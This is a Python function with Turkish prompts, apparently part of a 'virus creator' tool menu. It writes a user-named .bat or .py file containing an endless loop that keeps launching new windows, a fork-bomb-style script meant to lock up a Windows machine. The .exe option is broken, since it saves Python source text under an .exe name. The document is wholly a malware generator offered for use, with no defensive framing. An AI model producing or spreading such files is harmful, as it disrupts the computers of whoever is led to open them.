def virus_create_1():
    import os
    import time

    print('''
\033[97mVirüsünüzün uzantısı ne olsun?
''')
    print("\033[38;2;255;100;100m[1]\033[0m .exe")
    print("\033[38;2;255;100;100m[2]\033[0m .bat")
    print("\033[38;2;255;100;100m[3]\033[0m .py")

    uzanti_secimi = input("\n\033[97mUzantı Seç ❯❯❯ ").strip()

    if uzanti_secimi not in ["1", "2", "3"]:
        print("\033[91mGeçersiz seçenek! Ana menüye dönülüyor...")
        time.sleep(2)
        return

    ad = input("Virüs adı ne olsun ❯❯❯ ").strip()

    if uzanti_secimi == "1":
        dosya_adi = ad + ".exe"
    elif uzanti_secimi == "2":
        dosya_adi = ad + ".bat"
    elif uzanti_secimi == "3":
        dosya_adi = ad + ".py"

    try:
        with open(dosya_adi, "w") as dosya:
            if uzanti_secimi == "1" or uzanti_secimi == "3":
                dosya.write("""import os
while True:
    os.system("start")
""")
            elif uzanti_secimi == "2":
                dosya.write("""@echo off
:basla
start
goto basla
""")

        print("\n\033[92m[✓] Virüs bulunduğunuz dizine oluşturuldu: {}\033[0m".format(dosya_adi))
    except Exception as e:
        print("\033[91mBir hata oluştu:\033[0m", e)

    input("\nAna menüye dönmek için ENTER...")